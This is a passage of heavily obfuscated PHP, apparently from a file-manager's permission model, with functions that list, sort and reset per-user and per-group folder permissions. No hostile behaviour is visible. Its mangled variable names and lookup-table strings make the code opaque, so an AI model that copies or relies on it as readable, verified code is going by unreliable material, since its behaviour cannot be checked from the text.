Model($í¢ïÄ²½[1534])->parentLevelArray($ªô¦·Ÿ[$í¢ïÄ²½[604]]); $ÔÚêÀº¼ = array_merge(array(intval($¦ŒÖÃöÂ)), array_reverse($ç«á¦å)); $«ÜÛ›Û› = $this->sourceAuthSelect($ÔÚêÀº¼); $«­¹ÙÄ€ = $GLOBALS[$í¢ïÄ²½[6]][$í¢ïÄ²½[92]][$í¢ïÄ²½[2288]] == 1; $ú¯ƒ®½Â = $«­¹ÙÄ€ ? 3 : 2; $€ÒãíÁÔ = Model($í¢ïÄ²½[1494])->getInfo($ªô¦·Ÿ[$í¢ïÄ²½[589]]); $ñìÀ§Ö¸ = explode($í¢ïÄ²½[50], trim($€ÒãíÁÔ[$í¢ïÄ²½[604]], $í¢ïÄ²½[50])); $Ïîı¯Æ¶ = array_merge(array($€ÒãíÁÔ[$í¢ïÄ²½[1496]]), array_reverse(array_slice($ñìÀ§Ö¸, $ú¯ƒ®½Â))); foreach ($«ÜÛ›Û› as $¦ŒÖÃöÂ => $˜¼Š§§Í) { foreach ($˜¼Š§§Í as $¨­­ªéµ) { if (!$¨­­ªéµ || !$¨­­ªéµ[$í¢ïÄ²½[589]] || $¨­­ªéµ[$í¢ïÄ²½[589]] == $í¢ïÄ²½[228]) { continue; } if ($¨­­ªéµ[$í¢ïÄ²½[188]] != SourceModel::TYPE_GROUP) { continue; } $Ïîı¯Æ¶[] = $¨­­ªéµ[$í¢ïÄ²½[589]]; } } $Ïîı¯Æ¶ = array_unique($Ïîı¯Æ¶); $ı±²ø—¾ = array($í¢ïÄ²½[428] => _get($GLOBALS[$í¢ïÄ²½[7]], $í¢ïÄ²½[428], 1), $í¢ïÄ²½[439] => _get($GLOBALS[$í¢ïÄ²½[7]], $í¢ïÄ²½[439], 500)); $GLOBALS[$í¢ïÄ²½[7]][$í¢ïÄ²½[428]] = 1; $GLOBALS[$í¢ïÄ²½[7]][$í¢ïÄ²½[439]] = 500; $÷œ‘“üİ = array($í¢ïÄ²½[508] => 0, $í¢ïÄ²½[2187] => AuthModel::authAll(), $í¢ïÄ²½[509] => LNG($í¢ïÄ²½[2367]), $í¢ïÄ²½[2202] => $í¢ïÄ²½[2368]); $ğŞ©‡×Ô = array(); $„ù‡¤ß = explode($í¢ïÄ²½[50], $í¢ïÄ²½[2369]); $°°İèÄä = explode($í¢ïÄ²½[50], $í¢ïÄ²½[2370]); foreach ($Ïîı¯Æ¶ as $°àïÔ—À) { $Æ‰ÖõÜÂ = Model($í¢ïÄ²½[1494])->getInfo($°àïÔ—À); $ğìÂ¡Úş = array_field_key($Æ‰ÖõÜÂ, $„ù‡¤ß); $¢Êœòç = Model($í¢ïÄ²½[617])->listByGroup($°àïÔ—À); foreach ($¢Êœòç[$í¢ïÄ²½[446]] as $õŒ‹‹—Š => $“·¯¿ô„) { $this->userGroupList($“·¯¿ô„[$í¢ïÄ²½[1593]], $“·¯¿ô„); $‰„²Ä§û = $“·¯¿ô„[$í¢ïÄ²½[1593]] . $í¢ïÄ²½[12]; if (isset($ğŞ©‡×Ô[$‰„²Ä§û])) { continue; } $Şæ÷¢Ğ‚ = Model($í¢ïÄ²½[2371])->listData($“·¯¿ô„[$í¢ïÄ²½[2372]]); $“·¯¿ô„[$í¢ïÄ²½[2373]] = Action($í¢ïÄ²½[2374])->parseUrl($“·¯¿ô„[$í¢ïÄ²½[2373]]); $“·¯¿ô„[$í¢ïÄ²½[1941]] = $Şæ÷¢Ğ‚ && $Şæ÷¢Ğ‚[$í¢ïÄ²½[2375]] == 1; $‘ƒµ¶ = $this->groupRootAuth($°àïÔ—À, $“·¯¿ô„[$í¢ïÄ²½[1593]]); $‘ƒµ¶ = $“·¯¿ô„[$í¢ïÄ²½[1941]] ? $÷œ‘“üİ : $‘ƒµ¶; $ğŞ©‡×Ô[$‰„²Ä§û] = array($í¢ïÄ²½[2376] => $í¢ïÄ²½[2377], $í¢ïÄ²½[2378] => LNG($í¢ïÄ²½[2379]), $í¢ïÄ²½[2356] => array_field_key($“·¯¿ô„, $°°İèÄä), $í¢ïÄ²½[502] => $‘ƒµ¶, $í¢ïÄ²½[503] => $‘ƒµ¶[$í¢ïÄ²½[502]], $í¢ïÄ²½[2380] => $ğìÂ¡Úş); } } $GLOBALS[$í¢ïÄ²½[7]][$í¢ïÄ²½[428]] = $ı±²ø—¾[$í¢ïÄ²½[428]]; $GLOBALS[$í¢ïÄ²½[7]][$í¢ïÄ²½[439]] = $ı±²ø—¾[$í¢ïÄ²½[439]]; foreach ($«ÜÛ›Û› as $¦ŒÖÃöÂ => $˜¼Š§§Í) { if (!$˜¼Š§§Í) { continue; } foreach ($˜¼Š§§Í as $¨­­ªéµ) { if (!$¨­­ªéµ || !$¨­­ªéµ[$í¢ïÄ²½[589]] || $¨­­ªéµ[$í¢ïÄ²½[589]] == $í¢ïÄ²½[228]) { continue; } if ($¨­­ªéµ[$í¢ïÄ²½[188]] != SourceModel::TYPE_USER) { continue; } $‰„²Ä§û = $¨­­ªéµ[$í¢ïÄ²½[589]] . $í¢ïÄ²½[12]; if (isset($ğŞ©‡×Ô[$‰„²Ä§û])) { continue; } $òê£°Êé = $this->authMake($˜¼Š§§Í, $‰„²Ä§û); if (!$òê£°Êé || !$òê£°Êé[$í¢ïÄ²½[2378]]) { continue; } $ğŞ©‡×Ô[$‰„²Ä§û] = array($í¢ïÄ²½[2376] => $í¢ïÄ²½[2381], $í¢ïÄ²½[2378] => $òê£°Êé[$í¢ïÄ²½[2378]], $í¢ïÄ²½[2356] => Model($í¢ïÄ²½[617])->getInfoSimpleOuter($‰„²Ä§û), $í¢ïÄ²½[502] => $òê£°Êé[$í¢ïÄ²½[556]], $í¢ïÄ²½[503] => $òê£°Êé[$í¢ïÄ²½[556]][$í¢ïÄ²½[502]], $í¢ïÄ²½[2380] => $òê£°Êé[$í¢ïÄ²½[2382]]); } } foreach ($«ÜÛ›Û› as $¦ŒÖÃöÂ => $˜¼Š§§Í) { if (!$˜¼Š§§Í) { continue; } foreach ($ğŞ©‡×Ô as $‰„²Ä§û => $ğÂˆÔÖ) { if ($ğÂˆÔÖ[$í¢ïÄ²½[2356]][$í¢ïÄ²½[1941]] || $ğÂˆÔÖ[$í¢ïÄ²½[2376]] == $í¢ïÄ²½[2381]) { continue; } $òê£°Êé = $this->authMake($˜¼Š§§Í, $‰„²Ä§û); if (!$òê£°Êé || !$òê£°Êé[$í¢ïÄ²½[2378]]) { continue; } $ğŞ©‡×Ô[$‰„²Ä§û] = array($í¢ïÄ²½[2376] => $í¢ïÄ²½[2381], $í¢ïÄ²½[2378] => $òê£°Êé[$í¢ïÄ²½[2378]], $í¢ïÄ²½[2356] => $ğÂˆÔÖ[$í¢ïÄ²½[2356]], $í¢ïÄ²½[502] => $òê£°Êé[$í¢ïÄ²½[556]], $í¢ïÄ²½[503] => $òê£°Êé[$í¢ïÄ²½[556]][$í¢ïÄ²½[502]], $í¢ïÄ²½[2380] => $òê£°Êé[$í¢ïÄ²½[2382]]); } } $ğŞ©‡×Ô = array_sort_by($ğŞ©‡×Ô, $í¢ïÄ²½[503], $í¢ïÄ²½[540]); return $ğŞ©‡×Ô; } public function getAllChildren($ßÊíÀ¯¥) { $ÄêƒÒÅ„ =& $_SERVER[µÅ˜º…æ]; $‘ŠÌÄ»Ø = Model($ÄêƒÒÅ„[1534])->sourceInfo($ßÊíÀ¯¥); if ($‘ŠÌÄ»Ø[$ÄêƒÒÅ„[500]] != $ÄêƒÒÅ„[91]) { return $this->sourceListAuth(array($ßÊíÀ¯¥)); } if ($‘ŠÌÄ»Ø[$ÄêƒÒÅ„[188]] != SourceModel::TYPE_GROUP) { return array(); } $â¹™ª‹ = 1; $šøîüô™ = array($ßÊíÀ¯¥); if ($‘ŠÌÄ»Ø[$ÄêƒÒÅ„[190]] == $ÄêƒÒÅ„[228] && $‘ŠÌÄ»Ø[$ÄêƒÒÅ„[589]] != $â¹™ª‹) { $šøîüô™ = $this->groupChidldAllRootSource($‘ŠÌÄ»Ø[$ÄêƒÒÅ„[589]]); } $êÛÚ‡ô€ = $this->field($ÄêƒÒÅ„[191])->group($ÄêƒÒÅ„[191])->select(); $êÛÚ‡ô€ = array_to_keyvalue($êÛÚ‡ô€, $ÄêƒÒÅ„[12], $ÄêƒÒÅ„[191]); if (!$êÛÚ‡ô€) { return array(); } $ÜØÑÌÒ = $ÄêƒÒÅ„[2383]; $à‚®Áüı = array($ÄêƒÒÅ„[191] => array($ÄêƒÒÅ„[7], $êÛÚ‡ô€), $ÄêƒÒÅ„[520] => $ÄêƒÒÅ„[228]); $¹í›Ğ¡ = Model($ÄêƒÒÅ„[932])->field($ÜØÑÌÒ)->where($à‚®Áüı)->select(); $¸µ©œí = array($ßÊíÀ¯¥); foreach ($¹í›Ğ¡ as $‘±‚ÆØÑ) { foreach ($šøîüô™ as $ô£âÒÛ¶) { $Ä³Ì×‚ = $ÄêƒÒÅ„[50] . $ô£âÒÛ¶ . $ÄêƒÒÅ„[50]; $¥Í‘ô€¬ = $‘±‚ÆØÑ[$ÄêƒÒÅ„[604]] . $‘±‚ÆØÑ[$ÄêƒÒÅ„[191]] . $ÄêƒÒÅ„[50]; if (strstr($¥Í‘ô€¬, $Ä³Ì×‚)) { $¸µ©œí[] = $‘±‚ÆØÑ[$ÄêƒÒÅ„[191]]; break; } } } return $this->sourceListAuth($¸µ©œí); } private function sourceListAuth($¾¼œĞï½) { $íÅÂòºí =& $_SERVER[µÅ˜º…æ]; $ã¨äúìÖ = Model($íÅÂòºí[1534])->sourceListInfo($¾¼œĞï½, !0); $“ÍÓºÁ = $this->sourceAuthSelect($¾¼œĞï½); $¿šõ­â = array(); $½ûã ‚¹ = array(); foreach ($ã¨äúìÖ as $éãàşÑ¸) { unset($éãàşÑ¸[$íÅÂòºí[543]]); unset($éãàşÑ¸[$íÅÂòºí[541]]); unset($éãàşÑ¸[$íÅÂòºí[502]]); unset($éãàşÑ¸[$íÅÂòºí[90]]); $åôÈ¥Š¸ = $“ÍÓºÁ[$éãàşÑ¸[$íÅÂòºí[191]]]; if (!$åôÈ¥Š¸) { continue; } $éãàşÑ¸[$íÅÂòºí[2380]] = $this->authTargetInfo($åôÈ¥Š¸); $éãàşÑ¸[$íÅÂòºí[602]] = rtrim($éãàşÑ¸[$íÅÂòºí[608]], $íÅÂòºí[8]) . $íÅÂòºí[8] . ltrim($éãàşÑ¸[$íÅÂòºí[602]], $íÅÂòºí[8]); $¿šõ­â[] = $éãàşÑ¸; $ØĞ“ÉÃ× = count(explode($íÅÂòºí[8], trim($éãàşÑ¸[$íÅÂòºí[602]], $íÅÂòºí[8]))); $½ûã ‚¹[] = $ØĞ“ÉÃ× + ($éãàşÑ¸[$íÅÂòºí[33]] == $íÅÂòºí[78] ? 0 : 1000); } array_multisort($½ûã ‚¹, SORT_ASC, $¿šõ­â); return $¿šõ­â; } private function groupChidldAllRootSource($ÉŒùÄ‘) { $ã’éÉš =& $_SERVER[µÅ˜º…æ]; $Ê ·ïÈŸ = Model($ã’éÉš[1494])->groupChildrenAll($ÉŒùÄ‘); $³ß­éœ¶ = array($ã’éÉš[190] => 0, $ã’éÉš[589] => array($ã’éÉš[7], $Ê ·ïÈŸ), $ã’éÉš[188] => SourceModel::TYPE_GROUP); $Ö•¹‹î„ = Model($ã’éÉš[932])->field($ã’éÉš[191])->where($³ß­éœ¶)->select(); $Ö•¹‹î„ = array_to_keyvalue($Ö•¹‹î„, $ã’éÉš[12], $ã’éÉš[191]); return $Ö•¹‹î„; } private function authTargetInfo($ˆ¶¡Ø¸§) { $•Ü¼ƒêŞ =& $_SERVER[µÅ˜º…æ]; $ºØìüÆ = array(); $¹¨åÁá = array(); $¶ä™¼Óµ = 2 << 25; foreach ($ˆ¶¡Ø¸§ as $Ãó¨) { $ŞÇÔ–šß = Model($•Ü¼ƒêŞ[591])->listData($Ãó¨[$•Ü¼ƒêŞ[1641]]); if (!$ŞÇÔ–šß) { continue; } if ($Ãó¨[$•Ü¼ƒêŞ[188]] == SourceModel::TYPE_USER) { $ıé…ÛÔß = Model($•Ü¼ƒêŞ[597])->getInfoSimpleOuter($Ãó¨[$•Ü¼ƒêŞ[589]]); if ($ıé…ÛÔß[$•Ü¼ƒêŞ[1593]] == $•Ü¼ƒêŞ[1381]) { continue; } if ($ıé…ÛÔß[$•Ü¼ƒêŞ[1593]] == $•Ü¼ƒêŞ[228]) { $ıé…ÛÔß[$•Ü¼ƒêŞ[32]] = LNG($•Ü¼ƒêŞ[2384]); } } else { $ıé…ÛÔß = Model($•Ü¼ƒêŞ[605])->getInfoSimple($Ãó¨[$•Ü¼ƒêŞ[589]]); } if (!$ıé…ÛÔß) { continue; } $ıé…ÛÔß[$•Ü¼ƒêŞ[556]] = $ŞÇÔ–šß; $ºØìüÆ[] = $ıé…ÛÔß; $‡ıèéË = 0; if ($Ãó¨[$•Ü¼ƒêŞ[188]] == SourceModel::TYPE_GROUP) { $‡ıèéË = $¶ä™¼Óµ * 2; } if ($Ãó¨[$•Ü¼ƒêŞ[188]] == SourceModel::TYPE_USER) { $‡ıèéË = $¶ä™¼Óµ; } if ($Ãó¨[$•Ü¼ƒêŞ[188]] == SourceModel::TYPE_USER && $Ãó¨[$•Ü¼ƒêŞ[589]] == $•Ü¼ƒêŞ[228]) { $‡ıèéË = 0; } $¹¨åÁá[] = $ŞÇÔ–šß[$•Ü¼ƒêŞ[502]] + $‡ıèéË; } array_multisort($¹¨åÁá, SORT_DESC, $ºØìüÆ); return $ºØìüÆ; } public function getAllChildrenByUser($’¦­”´³, $ÁúÈ“âê) { $éáØ•İñ =& $_SERVER[µÅ˜º…æ]; $üï¾±’ = Model($éáØ•İñ[617])->getInfo($ÁúÈ“âê); if (!$ÁúÈ“âê || !$’¦­”´³ || !$üï¾±’) { return array(); } $¡©Ó­ØÓ = Model($éáØ•İñ[1534])->sourceInfo($’¦­”´³); $Ÿ·š©Éè = array(); $®ŠêÆŞà = 1; if ($¡©Ó­ØÓ[$éáØ•İñ[190]] == $éáØ•İñ[228] && $¡©Ó­ØÓ[$éáØ•İñ[589]] != $®ŠêÆŞà && $this->groupContainUser($¡©Ó­ØÓ[$éáØ•İñ[589]], $ÁúÈ“âê)) { foreach ($üï¾±’[$éáØ•İñ[1495]] as $ÇğŒü•§) { $ÇÃ‰âáû = Model($éáØ•İñ[605])->getInfo($ÇğŒü•§[$éáØ•İñ[1496]]); $Ù¢¢¨ÌÂ = Model($éáØ•İñ[617])->getInfoSimpleOuter($ÁúÈ“âê); $Ù¢¢¨ÌÂ[$éáØ•İñ[556]] = $ÇğŒü•§[$éáØ•İñ[502]]; if (Model($éáØ•İñ[591])->authCheckAction($ÇğŒü•§[$éáØ•İñ[502]][$éáØ•İñ[502]], $éáØ•İñ[1565])) { continue; } $‘»öË²® = array($éáØ•İñ[32] => $éáØ•İñ[1399] . $ÇÃ‰âáû[$éáØ•İñ[32]], $éáØ•İñ[191] => $ÇÃ‰âáû[$éáØ•İñ[90]][$éáØ•İñ[191]], $éáØ•İñ[87] => KodIO::make($ÇÃ‰âáû[$éáØ•İñ[90]][$éáØ•İñ[191]]), $éáØ•İñ[190] => $éáØ•İñ[228], $éáØ•İñ[188] => $éáØ•İñ[598], $éáØ•İñ[33] => $éáØ•İñ[639], $éáØ•İñ[602] => $ÇÃ‰âáû[$éáØ•İñ[609]], $éáØ•İñ[1496] => $ÇÃ‰âáû[$éáØ•İñ[1496]], $éáØ•İñ[606] => $ÇÃ‰âáû[$éáØ•İñ[190]], $éáØ•İñ[2380] => array($Ù¢¢¨ÌÂ)); $Ÿ·š©Éè[$‘»öË²®[$éáØ•İñ[191]]] = $‘»öË²®; } } $ÂóŒüµÉ = array(); $Îèò‡ÍÅ = $this->getAllChildren($’¦­”´³); foreach ($Îèò‡ÍÅ as $×Ø½‰ø) { $µûµğŠ° = !1; foreach ($×Ø½‰ø[$éáØ•İñ[2380]] as $ƒ¶³Á»–) { if ($ƒ¶³Á»–[$éáØ•İñ[1593]]) { if ($ƒ¶³Á»–[$éáØ•İñ[1593]] == $ÁúÈ“âê) { $µûµğŠ° = !0; break; } } if ($ƒ¶³Á»–[$éáØ•İñ[1496]]) { if ($this->groupContainUser($ƒ¶³Á»–[$éáØ•İñ[1496]], $ÁúÈ“âê)) { $µûµğŠ° = !0; break; } } } if ($µûµğŠ°) { $ÂóŒüµÉ[] = $×Ø½‰ø; } $Ï®İÙ³Ö = $×Ø½‰ø[$éáØ•İñ[191]]; if (isset($Ÿ·š©Éè[$Ï®İÙ³Ö])) { $×Ø½‰ø[$éáØ•İñ[2380]][] = $Ÿ·š©Éè[$Ï®İÙ³Ö][0]; $Ÿ·š©Éè[$Ï®İÙ³Ö] = !1; } } $Ÿ·š©Éè = array_filter(array_values($Ÿ·š©Éè)); $ÂóŒüµÉ = array_merge($Ÿ·š©Éè, $ÂóŒüµÉ); return $ÂóŒüµÉ; } public function setAllChildrenByUser($Ôµ—ıäö, $µ·›²Š›, $÷÷ë´ÂÍ) { $ÂˆŠÍ„¨ =& $_SERVER[µÅ˜º…æ]; $©¡›ª‹ª = $this->getAllChildrenByUser($Ôµ—ıäö, $µ·›²Š›); if (!$÷÷ë´ÂÍ || !$©¡›ª‹ª) { return !1; } foreach ($©¡›ª‹ª as $ÎÀ¼Ç¶Å) { $«ã‡µŸÓ = array(); foreach ($ÎÀ¼Ç¶Å[$ÂˆŠÍ„¨[2380]] as $˜”ñ¢çÏ) { $Ÿøİ›ñ÷ = $˜”ñ¢çÏ[$ÂˆŠÍ„¨[556]]; $”Ê¨ÁËÑ = $˜”ñ¢çÏ[$ÂˆŠÍ„¨[1593]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ŞÕúÕğ¬ = $˜”ñ¢çÏ[$ÂˆŠÍ„¨[1593]] ? $˜”ñ¢çÏ[$ÂˆŠÍ„¨[1593]] : $˜”ñ¢çÏ[$ÂˆŠÍ„¨[1496]]; if ($˜”ñ¢çÏ[$ÂˆŠÍ„¨[1593]] && $˜”ñ¢çÏ[$ÂˆŠÍ„¨[1593]] == $µ·›²Š›) { continue; } $«ã‡µŸÓ[] = array($ÂˆŠÍ„¨[191] => $ÎÀ¼Ç¶Å[$ÂˆŠÍ„¨[191]], $ÂˆŠÍ„¨[188] => $”Ê¨ÁËÑ, $ÂˆŠÍ„¨[589] => intval($ŞÕúÕğ¬), $ÂˆŠÍ„¨[1641] => isset($Ÿøİ›ñ÷[$ÂˆŠÍ„¨[487]]) ? intval($Ÿøİ›ñ÷[$ÂˆŠÍ„¨[487]]) : 0, $ÂˆŠÍ„¨[2344] => isset($Ÿøİ›ñ÷[$ÂˆŠÍ„¨[2344]]) ? intval($Ÿøİ›ñ÷[$ÂˆŠÍ„¨[2344]]) : -1); } $«ã‡µŸÓ[] = array($ÂˆŠÍ„¨[191] => $ÎÀ¼Ç¶Å[$ÂˆŠÍ„¨[191]], $ÂˆŠÍ„¨[188] => SourceModel::TYPE_USER, $ÂˆŠÍ„¨[589] => intval($µ·›²Š›), $ÂˆŠÍ„¨[1641] => intval($÷÷ë´ÂÍ), $ÂˆŠÍ„¨[2344] => -1); $this->where(array($ÂˆŠÍ„¨[506] => $ÎÀ¼Ç¶Å[$ÂˆŠÍ„¨[191]]))->delete(); $this->addAll($«ã‡µŸÓ); } return !0; } public function get($ÚÀ’ÊÜ) { $´—ÃÒşõ = $this->getSourceList(array($ÚÀ’ÊÜ), !0); return $´—ÃÒşõ[0]; } public function getSourceList($‰¼Øæ, $Ğæêâ“Ï = false, $ŸÔŸĞ™Ü = false) { $±ÈàÁõŒ =& $_SERVER[µÅ˜º…æ]; if (!$‰¼Øæ) { return array(); } $‡¬Şº£ = Model($±ÈàÁõŒ[1534]); if (!$Ğæêâ“Ï && count($‰¼Øæ) == 1) { $Ğæêâ“Ï = array(); $Ğæêâ“Ï[$‰¼Øæ[0]] = $‡¬Şº£->sourceInfo($‰¼Øæ[0]); } if (!$Ğæêâ“Ï) { $úÌ¨Äß” = array($±ÈàÁõŒ[506] => array($±ÈàÁõŒ[507], $‰¼Øæ)); $Ğæêâ“Ï = $‡¬Şº£->field($±ÈàÁõŒ[2385])->where($úÌ¨Äß”)->select(); $Ğæêâ“Ï = array_to_keyvalue($Ğæêâ“Ï, $±ÈàÁõŒ[191]); } $Ü¾¬ºü = $‰¼Øæ; foreach ($Ğæêâ“Ï as $Ûäœ¥³Œ => $šÖÏ‡ó) { $’¡‰“éã = $‡¬Şº£->parentLevelArray($šÖÏ‡ó[$±ÈàÁõŒ[604]]); $Ü¾¬ºü = array_merge($Ü¾¬ºü, array(intval($Ûäœ¥³Œ)), array_reverse($’¡‰“éã)); } $Ü¾¬ºü = array_values(array_unique($Ü¾¬ºü)); if (!$Ü¾¬ºü) { return array(); } $î·æÊç¬ = $this->sourceAuthSelect($Ü¾¬ºü); $¨ÎıíÛ¾ = array(); foreach ($Ü¾¬ºü as $¶ó½ôü€) { if (isset($î·æÊç¬[$¶ó½ôü€])) { $¨ÎıíÛ¾[$¶ó½ôü€] = $î·æÊç¬[$¶ó½ôü€]; } } $ÅÖĞ …¬ = $this->userIsRoot($ŸÔŸĞ™Ü); $ôâÏÂš = AuthModel::authAll(); $Ù®ÅÔê¿ = array($±ÈàÁõŒ[503] => $ôâÏÂš, $±ÈàÁõŒ[2386] => array($±ÈàÁõŒ[508] => 0, $±ÈàÁõŒ[2187] => $ôâÏÂš, $±ÈàÁõŒ[509] => LNG($±ÈàÁõŒ[2367]), $±ÈàÁõŒ[2202] => $±ÈàÁõŒ[2368])); $ØÈˆ—åà = array(); foreach ($Ğæêâ“Ï as $¶ó½ôü€ => $·û±Ã•æ) { if ($ÅÖĞ …¬ && $GLOBALS[$±ÈàÁõŒ[6]][$±ÈàÁõŒ[2200]]) { $ØÈˆ—åà[$¶ó½ôü€] = $Ù®ÅÔê¿; continue; } $ØÈˆ—åà[$¶ó½ôü€] = $this->makeSourceAuth($·û±Ã•æ, $¨ÎıíÛ¾, $ŸÔŸĞ™Ü); } return $ØÈˆ—åà; } public function authDeepCheck($®›‘¡¥Š, $šöÀÈØ = false) { $‰Ô°Á‡ =& $_SERVER[µÅ˜º…æ]; $šöÀÈØ = $šöÀÈØ ? $šöÀÈØ : USER_ID; $°åäµù = $this->makeAuthDeep($šöÀÈØ); if (!in_array($®›‘¡¥Š, $°åäµù[$‰Ô°Á‡[2387]])) { return !1; } $ò¤÷ôè = array(); foreach ($°åäµù[$‰Ô°Á‡[2388]] as $¬‚é§‘ë => $ı³ĞÁä) { if (!in_array($®›‘¡¥Š, $ı³ĞÁä)) { continue; } $ò¤÷ôè[] = $¬‚é§‘ë; } if (!$ò¤÷ôè) { return !1; } $·Šø¹å = $ò¤÷ôè ? $ò¤÷ôè[0] : $®›‘¡¥Š; return array($‰Ô°Á‡[503] => -1, $‰Ô°Á‡[556] => array($‰Ô°Á‡[508] => $‰Ô°Á‡[1381], $‰Ô°Á‡[2187] => $‰Ô°Á‡[228], $‰Ô°Á‡[509] => LNG($‰Ô°Á‡[2389]), $‰Ô°Á‡[2202] => $‰Ô°Á‡[2390]), $‰Ô°Á‡[2378] => LNG($‰Ô°Á‡[2391]), $‰Ô°Á‡[2392] => $this->sourceAuthInfo($·Šø¹å)); } protected function makeAuthDeep($–óîüÎ = false) { $ÒÔÔÂ¼ =& $_SERVER[µÅ˜º…æ]; static $ñÎ¾Åıó = array(); $–óîüÎ = $–óîüÎ ? $–óîüÎ : USER_ID; if (isset($ñÎ¾Åıó[$–óîüÎ])) { return $ñÎ¾Åıó[$–óîüÎ]; } $È¶ÌÖœ® = Model($ÒÔÔÂ¼[2393])->listData(); $´Âµ½¢ = array(); foreach ($È¶ÌÖœ® as $°š×Ò™) { if ($°š×Ò™[$ÒÔÔÂ¼[502]] == 0 && $°š×Ò™[$ÒÔÔÂ¼[2201]] == $ÒÔÔÂ¼[91]) { $´Âµ½¢[] = $°š×Ò™[$ÒÔÔÂ¼[487]]; } } $Œ£–ƒı¼ = $this->userGroupParents($–óîüÎ); $©ì¦¤ÖŸ = array($ÒÔÔÂ¼[188] => SourceModel::TYPE_USER, $ÒÔÔÂ¼[589] => $–óîüÎ); if ($Œ£–ƒı¼) { $©ì¦¤ÖŸ = array(array($ÒÔÔÂ¼[188] => SourceModel::TYPE_USER, $ÒÔÔÂ¼[589] => $–óîüÎ), array($ÒÔÔÂ¼[188] => SourceModel::TYPE_GROUP, $ÒÔÔÂ¼[589] => array($ÒÔÔÂ¼[507], $Œ£–ƒı¼)), $ÒÔÔÂ¼[1169] => $ÒÔÔÂ¼[2283]); } $Ä®ç•ÑÔ = $this->field($ÒÔÔÂ¼[2394])->where($©ì¦¤ÖŸ)->select(); $ğãëí…‘ = array(); $÷¤‹õíµ = array_to_keyvalue_group($Ä®ç•ÑÔ, $ÒÔÔÂ¼[191]); foreach ($÷¤‹õíµ as $öà°¸ö => $Ø™Ÿ…‘æ) { $§³ñ±»„ = $this->authArrayCheck($Ø™Ÿ…‘æ, $–óîüÎ); if ($§³ñ±»„[$ÒÔÔÂ¼[503]] > 0) { $ğãëí…‘[] = $öà°¸ö . $ÒÔÔÂ¼[12]; } } if ($Œ£–ƒı¼) { $áÈüö•€ = Model($ÒÔÔÂ¼[605]); foreach ($Œ£–ƒı¼ as $¨ÖÑ¶³) { $üÒñÚ°Ñ = $áÈüö•€->getInfo($¨ÖÑ¶³); if (!$üÒñÚ°Ñ || !is_array($üÒñÚ°Ñ[$ÒÔÔÂ¼[90]])) { continue; } $ğãëí…‘[] = $üÒñÚ°Ñ[$ÒÔÔÂ¼[90]][$ÒÔÔÂ¼[191]]; } } $®²–¨üå = array(); $…Ø†¡ = $Œ£–ƒı¼; $ò™‚ÅÓî = Model($ÒÔÔÂ¼[1534]); $áÈüö•€ = Model($ÒÔÔÂ¼[605]); $§¶ê‰  = array(); $‹Ä©ö = array(); $ ‰Áº–™ = array(); $‰Ìİ¼‹ì = array(); if ($ğãëí…‘) { $œâÛ€Í² = $ò™‚ÅÓî->where(array($ÒÔÔÂ¼[191] => array($ÒÔÔÂ¼[507], $ğãëí…‘)))->select(); foreach ($œâÛ€Í² as $ÍÀéÀ°ä) { if ($ÍÀéÀ°ä[$ÒÔÔÂ¼[520]] == $ÒÔÔÂ¼[91]) { continue; } $­—Õ’à¤ = $ò™‚ÅÓî->parentLevelArray($ÍÀéÀ°ä[$ÒÔÔÂ¼[604]]); $®²–¨üå = array_merge($®²–¨üå, $­—Õ’à¤); $…Ø†¡[] = $ÍÀéÀ°ä[$ÒÔÔÂ¼[589]]; $§¶ê‰ [$ÍÀéÀ°ä[$ÒÔÔÂ¼[191]]] = $­—Õ’à¤; $‹Ä©ö[$ÍÀéÀ°ä[$ÒÔÔÂ¼[191]]] = $ÍÀéÀ°ä[$ÒÔÔÂ¼[589]]; } } $…Ø†¡ = array_values(array_unique($…Ø†¡)); $¨¯›ŞÉ¦ = $…Ø†¡; foreach ($¨¯›ŞÉ¦ as $¨ÖÑ¶³) { $üÒñÚ°Ñ = $áÈüö•€->getInfo($¨ÖÑ¶³); $­—Õ’à¤ = $ò™‚ÅÓî->parentLevelArray($üÒñÚ°Ñ[$ÒÔÔÂ¼[604]]); $…Ø†¡ = array_merge($…Ø†¡, $­—Õ’à¤); } $…Ø†¡ = array_values(array_unique($…Ø†¡)); foreach ($…Ø†¡ as $¨ÖÑ¶³) { $üÒñÚ°Ñ = $áÈüö•€->getInfo($¨ÖÑ¶³); $®²–¨üå[] = $üÒñÚ°Ñ[$ÒÔÔÂ¼[90]][$ÒÔÔÂ¼[191]]; $ ‰Áº–™[$¨ÖÑ¶³] = $üÒñÚ°Ñ[$ÒÔÔÂ¼[90]][$ÒÔÔÂ¼[191]]; $‰Ìİ¼‹ì[$¨ÖÑ¶³] = $ò™‚ÅÓî->parentLevelArray($üÒñÚ°Ñ[$ÒÔÔÂ¼[604]]); } foreach ($§¶ê‰  as $€ö©Úî¹ => $Îƒ«­±) { $ÔçïÄŠ€ = $‹Ä©ö[$€ö©Úî¹]; if (!$ÔçïÄŠ€ || !$ ‰Áº–™[$ÔçïÄŠ€]) { continue; } $»±×±±¨ = array(); foreach ($‰Ìİ¼‹ì[$ÔçïÄŠ€] as $¨ÖÑ¶³) { $»±×±±¨[] = $ ‰Áº–™[$¨ÖÑ¶³]; } $§¶ê‰ [$€ö©Úî¹] = array_merge($»±×±±¨, $Îƒ«­±); } $®²–¨üå = array_values(array_unique($®²–¨üå)); $ˆŞœ•Ö¿ = array($ÒÔÔÂ¼[2387] => $®²–¨üå, $ÒÔÔÂ¼[2388] => $§¶ê‰ ); $ñÎ¾Åıó[$–óîüÎ] = $ˆŞœ•Ö¿; return $ˆŞœ•Ö¿; } private function makeSourceAuth($ÈïÀ¯»“, $§Ç±‘äñ, $ÒËƒ¼»š = false) { $ÓÒü‚öØ =& $_SERVER[µÅ˜º…æ]; $„á÷‚Ò = $ÓÒü‚öØ[91]; $úŒğ¢½¬ = $ÈïÀ¯»“[$ÓÒü‚öØ[589]]; $Ëòğ«Ä = $ÈïÀ¯»“[$ÓÒü‚öØ[188]] == SourceModel::TYPE_GROUP; $ˆ¬çç¼ = $Ëòğ«Ä ? $this->groupRootAuth($úŒğ¢½¬, $ÒËƒ¼»š) : !1; if ($ˆ¬çç¼ && Model($ÓÒü‚öØ[591])->authCheckAction($ˆ¬çç¼[$ÓÒü‚öØ[502]], $ÓÒü‚öØ[1565])) { return $this->groupAuthInfo($ˆ¬çç¼, $úŒğ¢½¬); } $Ü†‘©ã£ = Model($ÓÒü‚öØ[1534])->parentLevelArray($ÈïÀ¯»“[$ÓÒü‚öØ[604]]); $Ü†‘©ã£ = 